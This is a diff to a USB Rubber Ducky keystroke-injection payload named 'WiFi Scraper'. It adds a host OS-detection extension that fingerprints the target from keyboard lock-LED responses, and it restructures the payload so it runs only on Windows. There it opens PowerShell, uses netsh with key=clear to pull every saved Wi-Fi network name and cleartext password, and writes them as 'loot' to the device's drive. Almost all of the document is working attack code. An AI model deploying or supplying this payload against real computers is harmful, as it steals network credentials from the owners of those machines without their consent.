@@ -2,6 +2,228 @@ REM TITLE WiFi Scraper
 REM AUTHOR KryptoKola
 REM DESCRIPTION Scrapes SSID and Password information from Windows profiles.
 
+REM Adds OS Detection Extension
+EXTENSION OS_DETECTION
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USB Rubber Ducky Host OS Detection
+        Generic OS detection at a high view is a moving target
+        results may vary greatly depending
+        on a combination of many variables:
+         - number of testing stages
+         - specific devices and versions tested against
+         - number of systems testing for (scope)
+         - detection techniques (passive/invisible/active/hybrid)
+         - overall speed
+         - overall accuracy
+
+        If all you require is windows vs <anything other os> detection, the
+        PASSIVE_WINDOWS_DETECT extension is recommended over this extension.
+
+        TARGET:
+            DEFAULT - Windows, Mac, Linux
+            ADVANCED_DETECTION - Windows, Mac, Linux, iOS, ChromeOS, Android
+
+        USAGE:
+            Uncomment the function call below to run this extension inline (here)
+            or call DETECT_OS() anywhere in your payload after the extension
+            Place this extension and the DETECT_OS() before
+            you would like to first reference $_OS to execute payload code conditionally
+
+        FEEDBACK:
+            As mentioned above, this a moving target (especially for mac systems)
+            Please report any issues identifying specific operating systems.
+            Your feedback will greatly help solidify the robustness of this extension
+
+        DEBUGGING:
+            SET DEBUGGING_OUTPUT DEFINE to TRUE, deploy on a target with text editor open for debug output
+    END_REM
+
+    REM CONFIGURATION:
+    REM For Debugging:
+    DEFINE #DEBUGGING_OUTPUT FALSE
+    DEFINE #ADVANCED_DETECTION FALSE
+    REM Timing fine tuning:
+    DEFINE #STARTUP_DELAY 1500
+    DEFINE #RESTART_WAIT 1000
+    DEFINE #CONNECT_WAIT 1000
+    DEFINE #OS_DETECT_MODE HID
+    DEFINE #OS_DETECT_VID VID_05AC
+    DEFINE #OS_DETECT_PID PID_021E
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #HOST_RESPONSE_TIMEOUT 1000
+
+    FUNCTION DETECT_OS()
+        $_HOST_CONFIGURATION_REQUEST_COUNT = 0
+        ATTACKMODE #OS_DETECT_MODE #OS_DETECT_VID #OS_DETECT_PID
+        DELAY #STARTUP_DELAY
+        SAVE_HOST_KEYBOARD_LOCK_STATE
+
+        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+            IF_DEFINED_TRUE #ADVANCED_DETECTION
+                STRING ADVANCED OS DETECT
+            ELSE_DEFINED
+                STRING OS DETECT
+            END_IF_DEFINED
+
+            ENTER
+            STRING test caps
+        END_IF_DEFINED
+
+        IF ($_CAPSLOCK_ON == FALSE) THEN
+            LED_R
+            CAPSLOCK
+            DELAY #HOST_RESPONSE_TIMEOUT
+        END_IF
+        LED_OFF
+
+        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+            ENTER
+            STRING test done
+        END_IF_DEFINED
+
+        IF $_RECEIVED_HOST_LOCK_LED_REPLY THEN
+            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                ENTER
+                STRING received led response
+            END_IF_DEFINED
+            LED_G
+            IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING prediction: Windows
+                END_IF_DEFINED
+                $_OS = WINDOWS
+            ELSE
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING prediction: Linux
+                END_IF_DEFINED
+                $_OS = LINUX
+            END_IF
+        ELSE
+            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                ENTER
+                STRING no led response
+                ENTER
+                STRING prediciton: MacOS
+            END_IF_DEFINED
+            $_OS = MACOS
+        END_IF
+
+        IF_DEFINED_TRUE #ADVANCED_DETECTION
+            IF ( $_OS == LINUX ) THEN
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING soft reconnect
+                END_IF_DEFINED
+                ATTACKMODE OFF
+                DELAY #RESTART_WAIT
+                ATTACKMODE #OS_DETECT_MODE #OS_DETECT_VID #OS_DETECT_PID
+                DELAY #CONNECT_WAIT
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING reconnected
+                END_IF_DEFINED
+                IF ($_CAPSLOCK_ON == TRUE) THEN
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING caps led on
+                        ENTER
+                        STRING test numlock
+                    END_IF_DEFINED
+                    NUMLOCK
+                    DELAY #HOST_RESPONSE_TIMEOUT
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING test done
+                    END_IF_DEFINED
+                    IF ($_NUMLOCK_ON == FALSE) THEN
+                        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                            ENTER
+                            STRING no numlock led
+                            ENTER
+                            STRING prediciton: ChromeOS
+                        END_IF_DEFINED
+                        $_OS = CHROMEOS
+                    ELSE
+                        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                            ENTER
+                            STRING numlock led on
+                            ENTER
+                            STRING testing scrolllock
+                        END_IF_DEFINED
+                        SCROLLLOCK
+                        DELAY #HOST_RESPONSE_TIMEOUT
+                        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                            ENTER
+                            STRING test done
+                        END_IF_DEFINED
+                        IF ($_SCROLLLOCK_ON == TRUE) THEN
+                            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                                ENTER
+                                STRING scrolllock led on
+                                ENTER
+                                STRING prediciton: Android
+                            END_IF_DEFINED
+                            $_OS = ANDROID
+                        ELSE
+                            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                                ENTER
+                                STRING no scrolllock reply
+                                ENTER
+                                STRING prediction: Linux
+                            END_IF_DEFINED
+                            $_OS = LINUX
+                        END_IF
+                    END_IF
+                END_IF
+            ELSE IF ($_OS == MACOS) THEN
+                IF ($_CAPSLOCK_ON == TRUE) THEN
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING caps led on
+                        ENTER
+                        STRING prediction: iOS
+                    END_IF_DEFINED
+                    $_OS = IOS
+                ELSE 
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING no caps reply
+                        ENTER
+                        STRING prediction: MacOS
+                    END_IF_DEFINED
+                    $_OS = MACOS
+                END_IF
+            ELSE IF ($_OS == WINDOWS) THEN
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING Confident Windows Prediction
+                END_IF_DEFINED
+                $_OS = WINDOWS
+            END_IF
+        END_IF_DEFINED
+
+        RESTORE_HOST_KEYBOARD_LOCK_STATE
+
+        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+            ENTER
+            STRING OS_DETECT complete
+            ENTER
+        END_IF_DEFINED
+    END_FUNCTION
+
+    REM Uncomment the function call below to run this extension inline (here)
+    REM or call DETECT_OS() anywhere in your payload after the extension
+    REM DETECT_OS()
+END_EXTENSION
+
+REM Gets OS Type
+DETECT_OS()
+
 REM Defines USB Rubber Ducky Drive Label Name
 DEFINE #DRIVE_LABEL DUCKY
 
@@ -14,17 +236,17 @@ DELAY 2000
 REM Checks for Windows OS type before proceeding.
 IF ($_OS != WINDOWS)                                                                                                                                                                                                                                                     
     STOP_PAYLOAD 
+ELSE
+    GUI r
+    DELAY 500
+    STRINGLN powershell
+    DELAY 1000
+    STRINGLN $wifiProfiles = (netsh wlan show profiles) -match 'All User Profile\s*:\s*(.+)' | ForEach-Object {$_.Split(':')[1].Trim()}
+    STRINGLN $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    STRINGLN $lootDirectory = (Get-WmiObject win32_volume -f 'label=''#DRIVE_LABEL''').Name + 'loot/Wifi-Scraper/';
+    STRINGLN New-Item -Path $lootDirectory -ItemType Directory -Force | Out-Null
+    STRINGLN $loot = $lootDirectory + 'wifi_loot_' + $timestamp + '.txt';
+    STRINGLN $wifiProfiles | ForEach-Object {$profileName = $_;$profileInfo = netsh wlan show profile name="$profileName" key=clear;$ssidName = ($profileInfo | Select-String "SSID name" | ForEach-Object { $_.ToString().Split(':')[1].Trim() });$keyContent = ($profileInfo | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() });if ($ssidName -and $keyContent) { "$ssidName : $keyContent"}} | Out-File $loot
+    DELAY 500
+    STRINGLN exit
 END_IF
-
-GUI r
-DELAY 500
-STRINGLN powershell
-DELAY 1000
-STRINGLN $wifiProfiles = (netsh wlan show profiles) -match 'All User Profile\s*:\s*(.+)' | ForEach-Object {$_.Split(':')[1].Trim()}
-STRINGLN $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-STRINGLN $lootDirectory = (Get-WmiObject win32_volume -f 'label=''#DRIVE_LABEL''').Name + 'loot/Wifi-Scraper/';
-STRINGLN New-Item -Path $lootDirectory -ItemType Directory -Force | Out-Null
-STRINGLN $loot = $lootDirectory + 'wifi_loot_' + $timestamp + '.txt';
-STRINGLN $wifiProfiles | ForEach-Object {$profileName = $_;$profileInfo = netsh wlan show profile name="$profileName" key=clear;$ssidName = ($profileInfo | Select-String "SSID name" | ForEach-Object { $_.ToString().Split(':')[1].Trim() });$keyContent = ($profileInfo | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() });if ($ssidName -and $keyContent) { "$ssidName : $keyContent"}} | Out-File $loot
-DELAY 500
-STRINGLN exit
